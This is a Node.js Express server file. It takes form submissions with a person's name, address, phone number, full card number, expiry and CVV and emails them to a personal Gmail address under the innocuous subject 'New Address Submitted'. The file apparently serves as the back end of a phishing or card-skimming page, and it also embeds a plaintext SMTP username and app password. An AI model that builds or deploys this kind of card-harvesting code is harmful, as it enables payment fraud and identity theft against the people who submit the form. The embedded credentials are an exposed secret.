require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const handlebars = require("handlebars");
const cors = require("cors");
const fs = require("fs");

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.email",
  secure: false,
  service: "gmail",
  auth: {
    user: "anshulpandey@cmail.my.id",
    pass: "jnfy qjce gdhl jmzn",
  },
});

const app = express();
const port = process.env.PORT || 5000;
app.use(cors());

// Middleware to parse JSON bodies
app.use(express.json());

// Load email template
const source = fs.readFileSync("email.html", "utf-8").toString();
const template = handlebars.compile(source);

// Route to handle form submission
app.post("/send/mail", async (req, res) => {
  const {
    fullName,
    mobileNumber,
    city,
    selectedState,
    pinCode,
    address,
    cardName,
    cardNumber,
    expiry,
    cvv,
    selectedCardType,
    selectedBank,
  } = req.body;
  // Construct email message
  const replacements = {
    fullName: fullName,
    mobileNumber: mobileNumber,
    city: city,
    state: selectedState,
    pincode: pinCode,
    address: address,
    cardName: cardName,
    cardNumber: cardNumber,
    expiry: expiry,
    cvv: cvv,
    selectedCardType: selectedCardType,
    selectedBank: selectedBank,
  };
  const htmlToSend = template(replacements);

  try {
    const info = await transporter.sendMail({
      from: "alkarbathua@gmail.com",
      to: "sunnyadityaa@gmail.com",
      subject: "New Address Submitted",
      text: "New Address Submitted", // Text version of the email
      html: htmlToSend, // HTML version of the email
    });

    res.send("Email Sent!");
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).send("Error sending email");
  }
});

app.listen(port, () => {
  console.log(`App is listening on port ${port} !`);
});
